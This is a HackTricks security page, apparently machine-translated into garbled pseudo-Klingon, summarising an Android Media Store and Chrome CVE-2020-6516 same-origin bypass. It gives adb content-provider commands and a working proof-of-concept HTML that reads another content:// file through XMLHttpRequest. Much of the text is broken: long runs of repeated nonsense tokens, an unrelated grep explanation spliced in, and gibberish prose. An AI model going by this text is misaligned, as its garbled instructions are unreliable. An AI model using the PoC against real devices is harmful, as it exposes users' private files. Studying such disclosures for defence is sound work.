<details>

<summary><strong>qaStaHvIS AWS hacking vItlhutlh</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


**vItlhutlh [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/) post summary**

### Media Store Daq Files ngev
Media Store Daq files ngev, 'ej command vItlhutlh:
```bash
$ content query --uri content://media/external/file
```
### Human-Friendly Output

To achieve a more human-friendly output, you can display only the identifier and path of each indexed file. This will make it easier for users to understand and navigate through the indexed files.

```bash
$ grep -r -l "keyword" /path/to/directory
```

This command will search for the specified keyword in all files within the specified directory and display the identifier (filename) and path of each file that contains the keyword.

Example output:

```
file1.txt
file2.txt
file3.txt
```

By using this command, you can quickly identify the files that contain the desired keyword without having to go through the entire file content.
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
Content providers jImejDaq jImejDaqDaq jImejDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDaqDa
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
Discover the identifier of the newly inserted file:

**Klingon Translation:**

**ghItlh:** nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaqDaq nIvbogh qarDaq
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
The file can then be viewed in Chrome using a URL constructed with the file's identifier.

For instance, to list files related to a specific application:
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: Same-Origin-Policy Bypass

_**Same Origin Policy**_ (SOP) jatlh browsermeywI'pu' 'e' vItlhutlhlaHbe'chugh web pejatlhpu' 'e' vItlhutlhlaHbe'chugh resources 'e' vItlhutlhlaHbe'chugh 'ej Cross-Origin-Resource-Sharing (CORS) policy 'e' vItlhutlhlaHbe'chugh vaj 'e' vItlhutlhlaHbe'chugh. 'Iv 'e' vItlhutlhlaHbe'chugh policy 'e' vItlhutlhlaHbe'chugh 'ej cross-site request forgery vItlhutlhlaHbe'chugh. Chrome considers `content://` as a local scheme, implying stricter SOP rules, where each local scheme URL is treated as a separate origin.

However, CVE-2020-6516 was a vulnerability in Chrome that allowed a bypass of SOP rules for resources loaded via a `content://` URL. In effect, JavaScript code from a `content://` URL could access other resources loaded via `content://` URLs, which was a significant security concern, especially on Android devices running versions earlier than Android 10, where scoped storage was not implemented.

The proof-of-concept below demonstrates this vulnerability, where an HTML document, after being uploaded under **/sdcard** and added to the Media Store, uses `XMLHttpRequest` in its JavaScript to access and display the contents of another file in the Media Store, bypassing the SOP rules.

Proof-of-Concept HTML:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<details>

<summary><strong>qaStaHvIS AWS hacking vItlh</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
